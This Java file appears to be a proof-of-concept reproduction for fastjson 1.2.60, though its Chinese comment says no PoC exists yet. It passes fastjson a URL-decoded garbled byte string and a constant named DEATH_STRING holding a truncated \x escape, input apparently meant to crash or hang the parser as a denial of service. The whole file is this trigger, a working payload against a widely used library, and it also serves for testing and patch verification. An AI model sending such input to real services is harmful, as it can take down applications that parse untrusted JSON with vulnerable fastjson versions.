package fastjson;

import com.alibaba.fastjson.JSON;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

/**
 * 暂无poc
 */
public class fastjson_1_2_60 {
    static final String DEATH_STRING = "{\"a\":\"\\x";
    public static void main(String[] args) throws UnsupportedEncodingException {
        String line = new String("[{\\x22a\\x22:\\x22a\\xB1ph.\\xCD\\x86\\xBEI\\xBA\\xC3\\xBCiM+\\xCE\\xCE\\x1E\\xDF7\\x1E\\xD9z\\xD9Q\\x8A}\\xD4\\xB2\\xD5\\xA0y\\x98\\x08@\\xE1!\\xA8\\xEF^\\x0D\\x7F\\xECX!\\xFF\\x06IP\\xEC\\x9F[\\x85;\\x02\\x817R\\x87\\xFB\\x1Ch\\xCB\\xC7\\xC6\\x06\\x8F\\xE2Z\\xDA^J\\xEB\\xBCF\\xA6\\xE6\\xF4\\xF7\\xC1\\xE3\\xA4T\\x89\\xC6\\xB2\\x5Cx]");
        line = line.replaceAll("\\\\x", "%");
        String decodeLog = URLDecoder.decode(line, "UTF-8");
        System.out.println(decodeLog);
        try {
            Object obj = JSON.parse(decodeLog);
            obj = JSON.parse(DEATH_STRING);
        } catch (Exception e) {
        }
    }
}
